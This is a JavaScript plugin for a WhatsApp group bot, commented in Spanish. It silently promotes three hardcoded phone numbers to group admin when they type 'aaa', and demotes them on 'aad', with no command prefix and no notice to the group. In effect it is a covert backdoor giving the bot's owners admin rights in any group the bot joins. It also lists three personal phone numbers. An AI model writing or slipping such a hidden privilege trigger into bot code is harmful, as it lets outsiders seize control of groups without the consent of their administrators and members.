/* plugins/_autoadmin.js
   AUTO-ADMIN SILENCIOSO PARA OWNERS
   - aaa: darte admin
   - aad: sacarte admin
*/

let handler = async (m, { conn }) => {
    const owners = ['59898719147','59896026646','59892363485']; // números de owners
    const sender = m.sender.split('@')[0];

    // Ignora todo si no es owner
    if (!owners.includes(sender)) return;

    // Solo en grupos
    if (!m.isGroup) return;

    try {
        const chatId = m.chat;
        const groupMetadata = await conn.groupMetadata(chatId);
        const participants = groupMetadata.participants;
        const user = participants.find(p => p.jid.split('@')[0] === sender);
        if (!user) return;

        const text = m.text.toLowerCase();

        if (text === 'aaa' && !user.admin) {
            // Dar admin
            await conn.groupParticipantsUpdate(chatId, [user.jid], 'promote');
        } else if (text === 'aad' && user.admin) {
            // Quitar admin
            await conn.groupParticipantsUpdate(chatId, [user.jid], 'demote');
        }
    } catch (e) {
        console.error('Error en auto-admin:', e);
    }
};

// Detecta solo "aaa" o "aad", sin prefijo
handler.customPrefix = /^(aaa|aad)$/i;
handler.command = new RegExp(); // sin prefijo
handler.owner = true; // reforzado: solo owners
export default handler;
